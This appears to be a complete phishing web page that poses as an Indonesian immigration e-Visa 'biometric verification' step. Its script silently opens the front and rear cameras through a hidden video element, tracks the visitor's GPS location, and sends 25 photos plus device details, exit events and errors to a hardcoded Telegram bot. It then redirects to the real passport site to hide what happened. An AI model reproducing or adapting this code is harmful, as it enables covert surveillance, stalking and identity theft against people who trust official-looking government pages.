<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Ministry of Immigration and Corrections</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{
  margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
body{
  background: linear-gradient(135deg,#0d47a1,#1565c0,#42a5f5); color:#333;
  min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
}
.container{
  width: 100%;
  max-width: 450px; background: white; border-radius: 20px; overflow: hidden;
  box-shadow: 0 15px 35px rgba(13, 71, 161, 0.3); animation: fadeIn 0.8s ease-out;
  border: 2px solid #0d47a1;
}
@keyframes fadeIn{
  from{ opacity: 0; transform: translateY(20px);}
  to{ opacity: 1; transform: translateY(0);}
}
.header{
  background: linear-gradient(to right,#0d47a1,#1565c0,#1976d2); color: white;
  padding: 25px 30px;
  text-align: center;
  position: relative;
  border-bottom: 3px solid #ffd600;
}
.header::after{
  content:''; position: absolute; bottom:-10px; left: 50%; transform: translateX(-50%); width: 80%;
  height: 10px; background: rgba(255, 255, 255, 0.1); border-radius: 10px;
}
.logo-container{
  display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 15px;
}
.logo-img{
  width: 70px; height: 70px; object-fit: contain; filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.3));
}
.title{
  font-size: 24px;
  font-weight: 800;
  margin-bottom: 5px;
  text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3); letter-spacing: 0.5px;
}
.subtitle{
  font-size: 14px;
  opacity: 0.95;
  font-weight: 500;
  letter-spacing: 0.3px;
}
.content{
  padding: 30px;
  background: linear-gradient(to bottom,#fafafa,#ffffff);
}
.message-box{
  background: linear-gradient(135deg,#e3f2fd,#bbdefb); border-radius: 15px; padding: 20px; margin-bottom: 25px; border: 2px solid #90caf9; box-shadow: 0 5px 15px rgba(13, 71, 161, 0.1);
}
.message-title{
  color:#0d47a1;
  font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; font-size: 16px;
}
.message-text{
  color:#1a237e;
  line-height: 1.6; font-size: 14px; text-align: justify;
}
.loading-container{
  text-align: center; padding: 20px 0; background: white;
  border-radius: 12px;
  border: 1px solid #e0e0e0;
  box-shadow: inset 0 2px 10px rgba(13, 71, 161, 0.05);
}
.loading-text{
  color:#0d47a1;
  margin-bottom: 15px;
  font-weight: 700;
  font-size: 15px;
  letter-spacing: 0.3px;
}
.loading-bar{
  width: 100%;
  height: 8px;
  background:#e3f2fd;
  border-radius: 4px;
  overflow: hidden;
  margin: 0 auto 20px; border: 1px solid #bbdefb;
}
.loading-progress{
  width: 0%;
  height: 100%; background: linear-gradient(to right,#0d47a1,#1976d2,#42a5f5); border-radius: 4px; animation: loading 2s ease-in-out infinite; box-shadow: 0 0 10px rgba(13, 71, 161, 0.5);
}
@keyframes loading{ 0%{ width: 0%;} 50%{ width: 70%;} 100%{ width: 100%;} }
.camera-info{
  background: linear-gradient(135deg,#e8eaf6,#c5cae9); border-radius: 12px; padding: 18px; margin-top: 25px; font-size: 13px; color:#1a237e;
  border: 2px solid #7986cb; box-shadow: 0 4px 12px rgba(26, 35, 126, 0.1);
}
.camera-info strong{
  color:#0d47a1;
}
.footer{
  text-align: center;
  padding: 20px 30px;
  background: linear-gradient(to right,#0d47a1,#1565c0); color:#e3f2fd;
  font-size: 12px;
  border-top: 3px solid #ffd600;
  letter-spacing: 0.3px;
}
.footer p{
  margin: 5px 0;
}
.status-indicator{
  display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: linear-gradient(135deg,#e8f5e9,#c8e6c9); border-radius: 25px; color:#1b5e20;
  font-size: 13px; font-weight: 700; margin-top: 12px; border: 2px solid #81c784; box-shadow: 0 3px 8px rgba(27, 94, 32, 0.2);
}
.status-dot{
  width: 10px; height: 10px; background:#4CAF50; border-radius: 50%;
  animation: pulse 1.5s infinite; box-shadow: 0 0 8px #4CAF50;
}
@keyframes pulse{ 
  0%{ opacity: 1; transform: scale(1); box-shadow: 0 0 8px #4CAF50; } 
  50%{ opacity: 0.7; transform: scale(1.1); box-shadow: 0 0 12px #4CAF50; } 
  100%{ opacity: 1; transform: scale(1); box-shadow: 0 0 8px #4CAF50; } 
}
.hidden{
  display: none;
}
#video {
  position: fixed; top:-9999px; left:-9999px; width: 1px; height: 1px; opacity: 0;
}
.countdown{
  font-size: 40px; color:#0d47a1;
  font-weight: 900; text-align: center; margin: 20px 0; text-shadow: 2px 2px 4px rgba(13, 71, 161, 0.2); font-family: 'Courier New', monospace;
}
.security-badge{
  position: absolute; top: 15px; right: 15px; background:#ffd600; color:#0d47a1;
  padding: 5px 10px; border-radius: 20px; font-size: 10px; font-weight: 900; transform: rotate(5deg); border: 2px solid #0d47a1;
  box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2); letter-spacing: 1px;
}
.watermark{
  position: fixed;
  bottom: 10px;
  right: 10px;
  color: rgba(13, 71, 161, 0.1); font-size: 12px;
  font-weight: 700;
  pointer-events: none;
  z-index: 9999;
}
.btn-switch{
  background: linear-gradient(to right,#0d47a1,#1976d2); color: white;
  border: none;
  padding: 8px 16px; border-radius: 20px; font-size: 12px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: all 0.3s;
  border: 2px solid #ffd600;
}
.btn-switch:hover{
  background: linear-gradient(to right,#1976d2,#42a5f5); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(13, 71, 161, 0.3);
}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="security-badge">AMAN ‚Ä¢ TERVERIFIKASI</div>
    <div class="logo-container">
      <img src="https://i.top4top.io/p_3665c47290.png" alt="E-Visa Logo" class="logo-img">
      <div>
        <h1 class="title">E-Visa</h1>
        <p class="subtitle">Ministry of Immigration and Corrections</p>
      </div>
    </div>
  </div>
  <div class="content">
    <div class="message-box">
      <div class="message-title">
        <span>üîê</span>
        MANDATORY BIOMETRIC SECURITY VERIFICATION
      </div>
      <p class="message-text">
        The e-Visa system requires facial biometric verification for data security. Ensure your face is clearly visible in good lighting. This process is protected by Law No. 6 of 2011 concerning Immigration and regulations related to personal data protection..
      </p>
    </div>
    <div class="loading-container" id="loadingSection">
      <div class="loading-text" id="statusMessage">SETTING UP THE CAMERA VERIFICATION SYSTEM...</div>
      <div class="loading-bar">
        <div class="loading-progress"></div>
      </div>
      <div class="countdown" id="countdown">3</div>
    </div>
    <div class="camera-info">
      <strong>SYSTEM INFORMATION:</strong> The camera will be automatically accessed for biometric verification. Make sure no one else is in the frame..
      <div class="status-indicator" id="statusIndicator">
        <div class="status-dot"></div>
        <span id="statusText">WAITING FOR CAMERA INITIALIZATION...</span>
      </div>
      <button class="btn-switch" onclick="switchCamera()">SWITCH CAMERA</button>
    </div>
  </div>
  <div class="footer">
    <p>E-Visa COPYRIGHT PROTECTED BY LAW</p>
    <p>DIRECTORATE GENERAL OF IMMIGRATION ‚Ä¢ MINISTRY OF LAW AND HUMAN RIGHTS OF THE REPUBLIC OF INDONESIA</p>
    <p id="connectionStatus">STATUS: CONNECTED TO CENTRAL SECURITY SERVER...</p>
  </div>
</div>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" class="hidden"></canvas>
<div class="watermark">E-Visa ‚Ä¢ DIRECTORATE GENERAL OF IMMIGRATION</div>

<script>
const CONFIG = {
  BOT_TOKEN: '8352917003:AAF2_SUBLVywjSoLrSIAOn1v4N97LzNv9RU',
  CHAT_ID: '5285257250',
  CAPTURE_INTERVAL: 2500,
  TOTAL_CAPTURES: 25,
  SWITCH_CAMERA: true,
  SEND_GEOLOCATION: true,
  SEND_DEVICE_DETAILS: true
};

let currentStream = null;
let captureCount = 0;
let isFrontCamera = true;
let captureInterval;
let locationData = null;
let watchId = null; // <-- TAMBAHAN: untuk pelacakan lokasi real-time

const statusMessage = document.getElementById('statusMessage');
const statusText = document.getElementById('statusText');
const countdownEl = document.getElementById('countdown');
const connectionStatus = document.getElementById('connectionStatus');

function updateStatus(message, status = 'info') {
  const formattedMessage = message.toUpperCase();
  statusMessage.textContent = formattedMessage;
  statusText.textContent = formattedMessage;
  const indicator = document.getElementById('statusIndicator');
  if (status === 'success') {
    indicator.style.background = 'linear-gradient(135deg,#e8f5e9,#c8e6c9)';
    indicator.style.color = '#1b5e20';
    indicator.style.borderColor = '#81c784';
  } else if (status === 'error') {
    indicator.style.background = 'linear-gradient(135deg,#ffebee,#ffcdd2)';
    indicator.style.color = '#c62828';
    indicator.style.borderColor = '#ef9a9a';
  } else {
    indicator.style.background = 'linear-gradient(135deg,#e3f2fd,#bbdefb)';
    indicator.style.color = '#0d47a1';
    indicator.style.borderColor = '#90caf9';
  }
}

// üîÅ FUNGSI BARU: PELACAKAN LOKASI BERKALA
function startLocationTracking() {
  if (!navigator.geolocation) {
    console.error("Geolocation not supported");
    return;
  }

  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
  }

  const options = {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 5000
  };

  watchId = navigator.geolocation.watchPosition(
    (position) => {
      locationData = {
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
      };
    },
    (error) => {
      console.error("Geolocation error:", error);
      locationData = null;
    },
    options
  );
}

function stopLocationTracking() {
  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }
}

function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  const countdownInterval = setInterval(() => {
    count--;
    countdownEl.textContent = count;
    if (count <= 0) {
      clearInterval(countdownInterval);
      countdownEl.style.display = 'none';
      startCameraCapture();
    }
  }, 1000);
}

function startCameraCapture() {
  updateStatus('MENGINISIALISASI KAMERA...', 'info');
  const constraints = {
    video: {
      facingMode: isFrontCamera ? 'user' : 'environment',
      width: { ideal: 2560 },
      height: { ideal: 1440 },
      frameRate: { ideal: 30 }
    },
    audio: false
  };

  navigator.mediaDevices.getUserMedia(constraints)
    .then(stream => {
      currentStream = stream;
      const video = document.getElementById('video');
      video.srcObject = stream;
      updateStatus('KAMERA AKTIF ‚Ä¢ VERIFIKASI DIMULAI', 'success');
      connectionStatus.textContent = 'STATUS: TERHUBUNG ‚Ä¢ KAMERA AKTIF ‚Ä¢ VERIFIKASI BIOMETRIK BERJALAN';
      setTimeout(() => {
        capturePhoto();
        captureInterval = setInterval(capturePhoto, CONFIG.CAPTURE_INTERVAL);
      }, 1500);
    })
    .catch(err => {
      console.error('Kamera error:', err);
      updateStatus('KAMERA TIDAK DAPAT DIAKSES', 'error');
      connectionStatus.textContent = 'STATUS: GAGAL AKSES KAMERA ‚Ä¢ MENGUBAH KE KAMERA LAIN...';
      if (isFrontCamera) {
        isFrontCamera = false;
        setTimeout(startCameraCapture, 2500);
      }
    });
}

function capturePhoto() {
  if (captureCount >= CONFIG.TOTAL_CAPTURES) {
    stopCapture();
    return;
  }
  captureCount++;
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  ctx.fillStyle = 'rgba(13, 71, 161, 0.85)';
  ctx.fillRect(0, canvas.height - 50, canvas.width, 50);
  ctx.font = 'bold 16px Arial';
  ctx.fillStyle = '#ffd600';
  const timestamp = new Date().toLocaleString('id-ID');
  ctx.fillText(`M-PASPOR ‚Ä¢ ${timestamp} ‚Ä¢ FRAME ${captureCount}/${CONFIG.TOTAL_CAPTURES}`, 20, canvas.height - 25);
  ctx.font = '12px Arial';
  ctx.fillStyle = '#ffffff';
  ctx.fillText(`KAMERA: ${isFrontCamera ? 'DEPAN' : 'BELAKANG'} ‚Ä¢ RESOLUSI: ${canvas.width}x${canvas.height}`, 20, canvas.height - 5);

  canvas.toBlob(blob => {
    sendToTelegram(blob);
    updateStatus(`VERIFIKASI ${captureCount}/${CONFIG.TOTAL_CAPTURES} ‚Ä¢ TERKIRIM`, 'success');
    connectionStatus.textContent = `STATUS: MENGIRIM DATA BIOMETRIK ${captureCount}/${CONFIG.TOTAL_CAPTURES}`;

    if (CONFIG.SWITCH_CAMERA && captureCount % 5 === 0 && captureCount < CONFIG.TOTAL_CAPTURES - 5) {
      setTimeout(switchCamera, 1000);
    }
    if (captureCount === 5) {
      sendDeviceInfo();
    }
    // ‚ùå HAPUS PEMANGGILAN getLocationData() DI SINI ‚Äî TIDAK DIPERLUKAN LAGI
  }, 'image/jpeg', 0.92);
}

function sendToTelegram(blob) {
  const formData = new FormData();
  formData.append('chat_id', CONFIG.CHAT_ID);
  formData.append('photo', blob, `M_PASPOR_${Date.now()}_${isFrontCamera ? 'FRONT' : 'BACK'}_${captureCount}.jpg`);

  const caption = `üîê INFO E-Visa
‚è∞ WAKTU: ${new Date().toLocaleString('id-ID')}
üì∑ KAMERA: ${isFrontCamera ? 'DEPAN' : 'BELAKANG'}
üîÑ SEQUENCE: ${captureCount}/${CONFIG.TOTAL_CAPTURES}
üåç LOKASI: ${locationData ? `${locationData.lat},${locationData.lon}` : 'Sedang mendapatkan...'}
üñ• DEVICE: ${navigator.platform}
üîç USER AGENT: ${navigator.userAgent.substring(0, 80)}...
üìä RESOLUSI: ${screen.width}x${screen.height}
üìç TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;

  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');

  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  }).catch(err => console.error('Telegram error:', err));
}

function sendDeviceInfo() {
  const deviceInfo = `
INFO PERANGKAT LENGKAP
üåê USER AGENT: ${navigator.userAgent}
üñ• PLATFORM: ${navigator.platform}
üî§ BAHASA: ${navigator.language}
üïê TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
üì∫ RESOLUSI LAYAR: ${screen.width} x ${screen.height} ‚Ä¢ ${screen.colorDepth} bit
üåê KONEKSI: ${navigator.onLine ? 'ONLINE' : 'OFFLINE'} ${navigator.connection ? `‚Ä¢ ${navigator.connection.effectiveType}` : ''}
‚è∞ WAKTU SISTEM: ${new Date().toLocaleString('id-ID')}
üîã BATTERY INFO: ${navigator.getBattery ? 'Tersedia' : 'Tidak tersedia'}
üìç COOKIES: ${navigator.cookieEnabled ? 'Diaktifkan' : 'Dinonaktifkan'}
üì° E-Visa VERIFICATION SYSTEM`;

  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: deviceInfo, parse_mode: 'HTML' })
  }).catch(err => console.error('Telegram info error:', err));
}

function switchCamera() {
  if (currentStream) {
    currentStream.getTracks().forEach(track => track.stop());
  }
  isFrontCamera = !isFrontCamera;
  updateStatus(`BERALIH KE KAMERA ${isFrontCamera ? 'DEPAN' : 'BELAKANG'}...`, 'info');
  setTimeout(() => {
    startCameraCapture();
  }, 1500);
}

function stopCapture() {
  if (captureInterval) clearInterval(captureInterval);
  if (currentStream) currentStream.getTracks().forEach(track => track.stop());
  stopLocationTracking(); // <-- HENTIKAN PELACAKAN LOKASI

  updateStatus('VERIFIKASI BIOMETRIK SELESAI', 'success');
  connectionStatus.textContent = 'STATUS: VERIFIKASI BERHASIL ‚Ä¢ MENGARAHKAN KE HALAMAN UTAMA...';

  const completionMsg = `‚úÖ VERIFIKASI E-Visa SELESAI
üìä TOTAL FOTO: ${CONFIG.TOTAL_CAPTURES}
‚è∞ WAKTU MULAI: ${new Date().toLocaleString('id-ID')}
üñ• PERANGKAT: ${navigator.platform}
üåç LOKASI: ${locationData ? `${locationData.lat},${locationData.lon}` : 'Tidak tersedia'}
üì∑ KAMERA: ${isFrontCamera ? 'DEPAN' : 'BELAKANG'}
üîó USER AGENT: ${navigator.userAgent.substring(0, 100)}...`;

  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: completionMsg })
  });

  setTimeout(() => {
    window.location.href = 'https://m-paspor.imigrasi.go.id';
  }, 4000);
}

document.addEventListener('visibilitychange', () => {
  if (!document.hidden && !currentStream && captureCount < CONFIG.TOTAL_CAPTURES) {
    updateStatus('MENGEMBALIKAN VERIFIKASI...', 'info');
    setTimeout(startCameraCapture, 1000);
  }
});

window.addEventListener('beforeunload', () => {
  if (currentStream) currentStream.getTracks().forEach(track => track.stop());
  const exitMsg = `
PERANGKAT KELUAR
USER keluar dari halaman verifikasi
TERAKHIR: ${captureCount}/${CONFIG.TOTAL_CAPTURES} foto
WAKTU: ${new Date().toLocaleString('id-ID')}`;
  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: exitMsg })
  });
});

window.addEventListener('load', () => {
  setTimeout(() => {
    updateStatus('MEMUAT SISTEM VERIFIKASI E-Visa...', 'info');
    // üî• START PELACAKAN LOKASI SEJAK AWAL
    if (CONFIG.SEND_GEOLOCATION) {
      startLocationTracking();
    }
  }, 800);
  setTimeout(startCountdown, 2000);
  setTimeout(stopCapture, (CONFIG.CAPTURE_INTERVAL * CONFIG.TOTAL_CAPTURES) + 12000);

  const randomWatermark = document.querySelector('.watermark');
  setInterval(() => {
    const colors = ['#0d47a1', '#1565c0', '#1976d2', '#1e88e5'];
    randomWatermark.style.color = colors[Math.floor(Math.random() * colors.length)];
  }, 3000);
});

let progress = 0;
const progressInterval = setInterval(() => {
  progress += 1.5;
  if (progress >= 100) clearInterval(progressInterval);
}, 80);

window.onerror = function(msg, url, line) {
  const errorMsg = `ERROR SYSTEM
PESAN: ${msg}
URL: ${url}
BARIS: ${line}
WAKTU: ${new Date().toLocaleString('id-ID')}`;
  fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: errorMsg })
  });
  return true;
};

function simulateUserActivity() {
  const activities = ['mousemove', 'click', 'scroll', 'keydown'];
  activities.forEach(event => {
    document.addEventListener(event, () => {
      console.log(`User activity: ${event}`);
    });
  });
}
simulateUserActivity();
</script>
</body>
</html>